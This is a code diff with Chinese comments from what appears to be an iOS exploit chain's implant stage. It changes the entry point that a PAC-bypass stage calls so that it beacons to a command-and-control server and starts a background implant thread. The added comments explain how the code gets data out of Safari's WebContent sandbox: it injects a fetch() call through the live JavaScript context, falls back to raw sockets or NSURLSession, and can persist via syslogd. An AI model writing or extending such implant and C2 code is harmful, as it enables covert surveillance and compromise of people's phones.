@@ -23,18 +23,31 @@ extern void upload_beacon(void);
  * Stage3 无法在 LC_SYMTAB 中找到 _process → 抛错 → 链失败。
  *
  * 执行顺序：
- *   1. upload_beacon()      — 同步探针（最多阻塞 ~10s）。
- *                             优先走 Channel B（raw socket + SecureTransport），
- *                             这是 WebContent 沙盒内唯一可用的网络通道。
- *                             服务端见到此记录 → v1.3 二进制运行，raw-socket 通。
- *                             见不到此记录 → 沙盒封 443 出站，或 TLS 握手失败。
- *   2. coruna_constructor() — 启动后台 implant 线程（dispatch_once 保证单次）。
+ *   1. upload_beacon()      — 三通道诊断探针：
  *
- * upload_beacon() 最多阻塞 ~10 秒，不影响链成功率：
+ *        Channel C（JSContext 注入）[v1.4 新增，优先级最高]
+ *          process() 由 Stage3 PAC-bypass 直接调用，此时仍在 JSC 执行栈上，
+ *          vm.topCallFrame 有效，[JSContext currentContext] 返回活跃 JS 上下文。
+ *          调用 evaluateScript: 执行 fetch()，走 WebKit 自己的网络 XPC——
+ *          这是 WebContent 沙盒里 100% 可用的唯一上传路径。
+ *          日志中描述含 "(jsc)" → Channel C 成功。
+ *          同时保存 JSContext 强引用，供后台 implant 线程 dispatch_async 复用。
+ *
+ *        Channel B（raw socket + SecureTransport）[iOS 16+ WebContent: EPERM]
+ *          非 WebContent 环境（如 syslogd 持久化后）可用。
+ *          在 WebContent 内 socket() → EPERM，立即失败。
+ *
+ *        Channel A（NSURLSession）[WebContent 内被沙盒拒绝]
+ *          兜底，仅在 Channel B 也不可用时才尝试。
+ *
+ *   2. coruna_constructor() — 启动后台 implant 线程（dispatch_once 保证单次）。
+ *                             线程首行同样上报（描述含"(jsc)"或无后缀区分通道）。
+ *
+ * upload_beacon() 在 Channel C 成功时 <1 ms 返回，不影响链速度。
  * Stage3 仅等待 _process 返回，没有短路定时器。
  */
 __attribute__((visibility("default")))
 void process(void) {
-    upload_beacon();      /* 诊断层 1：同步上报，确认 C2 可达 */
-    coruna_constructor(); /* 诊断层 2：线程启动后第一行也会上报 */
+    upload_beacon();      /* 诊断层 1：同步上报，确认 C2 可达（Channel C/B/A） */
+    coruna_constructor(); /* 诊断层 2：线程启动后第一行也会上报               */
 }
